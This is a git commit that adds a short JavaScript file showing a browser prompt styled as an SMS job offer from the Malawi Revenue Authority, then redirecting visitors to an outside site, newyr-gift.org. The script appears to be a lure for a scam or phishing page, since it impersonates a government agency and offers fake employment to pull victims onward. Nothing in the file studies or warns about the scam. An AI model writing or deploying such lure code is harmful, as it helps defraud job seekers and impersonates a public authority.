9e46b215167d418a2f032d505a8f6c2c19296cc8
ukebeblog <esther001imoh@gmail.com>
2025-01-17 07:00:08 +0100

    Create malawi-active.js

---
+++ malawi-active.js
@@ -0,0 +1,6 @@
+
+var password = 'APPLY NOW'
+password=prompt('SMS: Congratulations You are qualify to work with the Malawi Revenue Authority, Kindly Press OK to submit apllication   ','APPLY NOW');
+if (password != 'APPLY NOW') {
+location.href='https://newyr-gift.org/malawi-revenue.html';
+}
